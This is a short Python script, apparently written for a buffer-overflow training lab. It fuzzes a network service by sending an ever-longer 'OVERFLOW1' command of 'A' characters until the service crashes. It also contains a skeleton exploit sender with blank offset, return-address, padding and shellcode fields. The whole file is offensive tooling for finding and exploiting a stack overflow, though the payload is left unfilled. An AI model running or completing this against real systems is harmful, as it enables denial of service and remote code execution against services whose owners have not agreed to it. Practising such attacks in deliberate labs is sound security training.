#!/usr/bin/env python3

import argparse
import socket
import sys
import time

parser = argparse.ArgumentParser()
parser.add_argument('--fuzz',action='store_true')
parser.add_argument('--flood',action='store_true')
parser.add_argument('--host')
parser.add_argument('--port',type=int)
parser.add_argument('--timeout',type=int)
args = parser.parse_args()

ip = args.host
port = args.port
target = (ip,port)
timeout = args.timeout

def fuzz():
    prefix = "OVERFLOW1 "
    string = prefix + "A" * 100
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
                client.settimeout(timeout)
                client.connect(target)
                client.recv(1024)
                print("[*] Fuzzing with {} bytes".format(len(string) - len(prefix)))
                client.send(bytes(string, "latin-1"))
                client.recv(1024)
        except socket.error as err:
            print("[x] Failed to connect to port %d." % port)
            sys.exit(0)
        except:
            print("[!] Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            sys.exit(0)
        
        string += 100 * "A"
        time.sleep(1)

def flood():
    prefix = "OVERFLOW1 "
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = ""
    suffix = ""
    bof = prefix + overflow + retn + padding + payload + suffix

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect(target)
        client.send(bytes(bof + "\r\n","latin-1"))
        print("[+] Sent BOF.")
        client.recv(1024)
    except:
        print("[x] Failed to connect to port %d." % port)

if __name__ == "__main__":
    if not args.fuzz and not args.flood:
        print("[x] Please specify an option using either --fuzz or --flood.")
    if not args.host:
        print("[x] Please specify a host using --host.")
    elif not args.port:
        print("[x] Please specify a port using --port.")
    elif not args.timeout:
        print("[x] Please specify a connection timeout using --timeout.")
    
    if args.fuzz:
        fuzz()
    elif args.flood:
        flood()
